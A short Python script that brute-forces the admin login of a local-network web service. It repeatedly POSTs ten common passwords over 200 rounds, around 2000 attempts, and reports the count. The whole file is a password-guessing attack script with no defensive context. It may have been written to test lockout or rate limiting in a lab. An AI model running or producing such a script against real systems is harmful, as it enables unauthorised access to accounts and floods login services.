import requests
TARGET = "http://192.168.1.236:8000"
passwords = ["admin", "123456", "password", "root", "qwerty", "letmein", "welcome", "monkey", "dragon", "master"]
print(f"Brute-forcing {TARGET}...")
attempts = 0
for round in range(200):
    for pwd in passwords:
        try:
            r = requests.post(TARGET, data={"username": "admin", "password": pwd}, timeout=2)
            attempts += 1
        except requests.RequestException:
            pass
print(f"Made {attempts} login attempts")